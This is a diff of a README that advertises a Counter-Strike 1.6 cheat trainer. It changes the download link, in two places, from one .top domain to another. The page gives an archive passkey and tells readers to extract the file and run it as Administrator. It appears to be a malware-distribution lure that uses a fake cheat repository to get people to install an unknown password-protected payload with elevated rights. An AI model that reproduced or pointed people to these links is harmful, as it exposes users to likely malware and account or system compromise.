@@ -6,7 +6,7 @@ Counter-Strike 1.6 trainer with aimbot, ESP, wallhack, speed hack, no recoil, an
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular mods like **OGC**, **CS 1.6 Cheat**, and **Half-Life Trainer**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Counter-Strike 1.6.
 4. Run the trainer **as Administrator**.
